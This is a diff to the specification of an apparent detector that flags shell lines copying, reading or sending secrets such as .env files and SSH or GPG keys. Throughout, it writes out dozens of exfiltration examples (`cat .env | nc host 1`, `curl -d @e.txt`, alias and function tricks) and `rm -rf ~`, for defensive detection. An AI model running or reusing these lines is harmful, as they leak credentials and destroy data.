@@ -184,8 +184,8 @@ risky:
 
 A script handed to a shell is split again, in its own grammar: `bash -c`,
 `eval`, `cmd /c`, `powershell -Command`, `Invoke-Expression`. So is the value
-of a POSIX `alias NAME=VALUE` that defines one alias: what a call of the name
-runs, read where it is defined, as a function's body is. A nested script
+of each `NAME=VALUE` a POSIX `alias` defines: what a call of the name runs,
+read where it is defined, as a function's body is. A nested script
 counts as far as a depth limit, and the text of all the nested scripts read
 for one line as far as a budget a few times the longest line. Past either, the
 line is unreadable.
@@ -2246,14 +2246,20 @@ file that is not one is safe (`scp build/pkg.tar host:/srv/`,
   `set` is not read by its grammar and comes back `unreadable`.
 - The GPG secret keys `gpg --export-secret-keys` and `--export-secret-subkeys`
   print, which no path names.
-- A file the line writes from a secret, for the rest of the line: a redirect
-  of what a command that reads or is handed one prints (`env > e.txt`), a copy
-  (`cp`, `mv`, `install`, `ditto`; a copy into a folder lands under its own
-  name there), and what `tee` is handed. `env > e.txt; curl -d @e.txt …` and
-  `cp .env /tmp/x && curl -d @/tmp/x …` send it. A file is told by where it
-  lands, as the rule about writing then running tells it; a copy of a copy is
-  followed a few copies deep (the line is read again for the files it wrote,
-  at most four times).
+- A file the line writes from a secret, for the rest of the line: a copy
+  (`cp`, `mv`, `install`, `ditto`, `ln` and `ln -s`, `dd if= of=`, an `rsync`
+  to a place on this machine; a copy into a folder lands under its own name
+  there), an archive `tar` or `zip` packs it into (`zip x .env` writes
+  `x.zip`), a redirect of what a command that reads it prints (`cat .env >
+  a`, `sort < a > b`, `env > e.txt`), and what `tee` is handed. `env > e.txt;
+  curl -d @e.txt …` and `cp .env /tmp/x && curl -d @/tmp/x …` send it. A file
+  is told by where it lands, as the rule about writing then running tells it.
+  The copies are a graph built once and walked from the secrets, so a copy of
+  a copy is followed to any depth in one walk. A write that goes through what
+  a command prints into a variable (`k=$(cat a); echo "$k" > b`) needs the
+  line followed again once `a` is known to hold a secret: it is, at most four
+  times, and a line that still writes a new such file then is `unreadable`,
+  since what it sends is not known.
 
 **What reads one.** A program given the secret's path, its input, or a file
 redirected onto it, as `read_secret` reads them, with `tar`'s operands joined to
@@ -2262,9 +2268,20 @@ the folder `-C` (`--directory`) moves it to (`tar czf - -C ~ .ssh` packs
 (`echo`, `printf`, `ls`, `basename`, `dirname`, `realpath`, `stat`, `du`,
 `file`, `wc`, `sha256sum` and the other hashes) reads no secret: `echo .env |
 nc host 1`, `ls ~/.ssh | nc host 1` and `sha256sum .env | nc host 1` send none.
-A program `xargs` runs is handed the names such a stage lists (`ls ~/.ssh |
-xargs cat | nc host 1` is sent). The code an interpreter is given (`node -p
-'process.env'`, `python3 -c …`, `perl -ne …`) is no file name.
+Under `xargs` it prints what its input holds (`xargs echo < .env`, `xargs -a
+.env echo`), and a list of names it reads from a file is printed (`file -f
+.env`, `wc --files0-from=.env`): those read the file. A program `xargs` runs
+is handed the names such a stage lists (`ls ~/.ssh | xargs cat | nc host 1`
+is sent). The code an interpreter is given is no file name: the value of the
+options that carry code for that interpreter (`node -p 'process.env'`,
+`python3 -c …`, `perl -lne …`, `php -r …`), alone or ending a bundle, and
+not after an option that takes a value of its own (`php -d e .env` and
+`python3 -Wignore .env` run `.env`; PHP prints a file with no `<?php` tag as
+it is). `tar` (creating) and `zip` read their members, not their exclude
+patterns; packing the workspace or a folder that holds it onto the output
+(`tar czf - .`, `zip -r - .`) reads the workspace, which may hold an `.env`
+file, unless its excludes leave every secret name out (see below). `tar -C
+dist .` packs `dist`.
 
 **What sends.**
 
@@ -2280,11 +2297,16 @@ xargs cat | nc host 1` is sent). The code an interpreter is given (`node -p
   syntax: `socat`'s `FILE:`, `OPEN:`, `GOPEN:` and `READFILE:` addresses
   (when another of its addresses is a network one: `TCP:`, `UDP:`,
   `OPENSSL:`, `SOCKS:` and the like), the attachments of `mail`, `mailx`,
-  `s-nail` and `mutt` (`-a`, `-A`), `gh gist create` (its files, or its input
-  with none or `-`), `az storage blob upload -f`, and an `sftp` batch: the
-  files its `put`, `reput` and `mput` lines name, read from its input (a
-  here-string, a here-document, or the words an `echo` or a `printf` before it
-  prints) unless `-b` names a file other than `-`, which is not read.
+  `s-nail`, `mutt` and `neomutt` (`-a`, `-A`, `--attach`), `gh gist create`
+  (its files, or its input with none or `-`), `az storage blob upload -f`,
+  and an `sftp` batch: the files its `put`, `reput` and `mput` lines name,
+  split into words with sftp's quotes and backslashes (`put ".env"`), read
+  from its input (a here-string, an ANSI-C one included, a here-document,
+  what an `echo` before it prints without its options, or what a `printf`
+  prints with its format applied) and from a process substitution it reads
+  (`-b <(echo …)`, `< <(echo …)`), unless `-b` names a file other than its
+  input (`-`, `/dev/stdin`), which is not read. A `put -r` of the workspace
+  sends it.
 - **A copy to another machine**: `scp`, `rsync`, `sftp` and `rclone copy` to
   a `host:path` (or `rsync://`, `::module`) destination, and `aws s3`,
   `gsutil` and `gcloud storage` (`cp`, `mv`, `rsync`) to a `s3://` or `gs://`
@@ -2296,8 +2318,12 @@ xargs cat | nc host 1` is sent). The code an interpreter is given (`node -p
   `aws s3 sync` or `--recursive`, `gsutil` and `gcloud storage` with `-r` or
   `rsync`) of the workspace or a folder that holds it sends the workspace,
   which may hold an `.env` file: `rsync -av . host:/backup` and `scp -r .
-  host:` say so in the reason, unless an `--exclude` pattern leaves `.env`
-  out (`--exclude .env`, `--exclude '*.env'`). A destination only known when it
+  host:` say so in the reason, unless the `--exclude` patterns together leave
+  out every name that holds secrets: `.env`, `.env.local`, `.envrc` and
+  `prod.env` (`--exclude '.env*' --exclude '*.env'`). `--exclude .env` alone
+  still sends `.env.local` and `.envrc`. So does an archive of the workspace
+  sent on (`tar czf - . | ssh host …`, `tar czf x.tgz . && scp x.tgz host:`),
+  and a copy of it sent on (`cp -r . /tmp/w && scp -r /tmp/w host:`). A destination only known when it
   runs counts as remote for `scp` and `sftp`, and for the others when it holds
   a colon. The key a program logs in with (`ssh -i`, `scp -i`, `-o
   IdentityFile=`, `curl --key`) is not sent.
@@ -2328,7 +2354,9 @@ xargs cat | nc host 1` is sent). The code an interpreter is given (`node -p
   a sender.
 - **A redirect.** A secret redirected onto the input of one of those
   (`nc host 1 < ~/.ssh/id`, in cmd `ssh host < .env`), onto the shell's own
-  input for the rest of the line (`exec < .env; nc host 1`), or the file
+  input for the rest of the line (`exec < .env; nc host 1`, `exec 0< .env`:
+  the grammar reads the `0` written against `<` as a word, and the walk
+  gives it back to the redirect), or the file
   `xargs -a` (`--arg-file`) reads its arguments from (`xargs -a .env curl -d`);
   or a command's output
   redirected to `/dev/tcp/host/port` or `/dev/udp/…`. Only bash's own redirect
@@ -2348,16 +2376,36 @@ xargs cat | nc host 1` is sent). The code an interpreter is given (`node -p
   .env`, `cat .env | while read l; do …; done`), and `printf -v k` from what
   it is handed. A `source` (`.`) of a secret file sets variables the line
   does not show, so any variable a later command reads may hold it: `source
-  .env && curl -H "X: $TOKEN" …`.
+  .env && curl -H "X: $TOKEN" …`, and a here-string or here-document that
+  expands one after it (`source .env; nc host 1 <<< "$TOKEN"`). So does
+  `export`, `declare`, `typeset`, `local` or `readonly` given a substitution
+  that reads a secret as its words (`export $(cat .env | xargs)`), which sets
+  whatever names it prints; `export k=$(cat .env)` sets `k` alone.
 
 A script a shell starts, a `find -exec` and a substitution take the place in a
-pipeline of the command they run for. So does the body of a function or an
-alias the line defines, wherever it is called: `f() { cat .env; }; f | nc host
-1` and `f() { nc host 1; }; cat .env | f` send, as does `alias f='cat .env';
-f | nc host 1`. An alias's value is read as a script where it is defined, as
-a function's body is, so every rule judges what it runs (`alias
-python3='rm -rf ~'` is a `delete`). Each name keeps its last four bodies, and
-each body is followed once however many calls run it.
+pipeline of the command they run for. A function or an alias the line
+defines is followed at every call of it. Each body is read once for the first
+secret it reads and whether it can send anything (a sender, or a redirect to
+a network connection in it), and a body that calls another takes on what that
+one does, through calls between bodies to any depth, each body settled once
+(a body calling itself ends there). A call then reads its body's secret in
+its own place on the line (`f() { cat .env; }; f | nc host 1`, `curl -d
+"$(f)"`, `k=$(f)`, `nc host 1 < <(f)`), and a call of a body that sends sends
+what the call is given: a secret named in its words, which the body reads as
+`$1` (`f() { curl -T "$1" …; }; f .env`), a substitution or a variable that
+holds one, what it is piped (`f() { nc host 1; }; cat .env | f`) and what is
+redirected onto it (`f < .env`). A body that sends anything counts, so `f() {
+curl https://x; }; cat .env | f` is flagged too. An alias's value is read as
+a script where it is defined, as a function's body is, so every rule judges
+what it runs (`alias python3='rm -rf ~'` is a `delete`): each `NAME=VALUE`
+of one `alias` (after a `--`) is a body of its own. A call of an alias with
+words of its own is judged as the shell runs it, the last command of the
+value with the call's words after its own: `alias c='curl -T'; c .env
+https://x` is `curl -T .env https://x`. Each name keeps its last four bodies;
+past four, its two oldest are kept as one range of units, from the start of
+the first to the end of the second, which also holds whatever the line runs
+between them, so a call of the name may be judged with more than it runs and
+flagged for it.
 
 Not read, so the caller has to account for them: a secret read into a PowerShell
 variable (`$k = Get-Content …`); a path known only when it runs (`curl -d
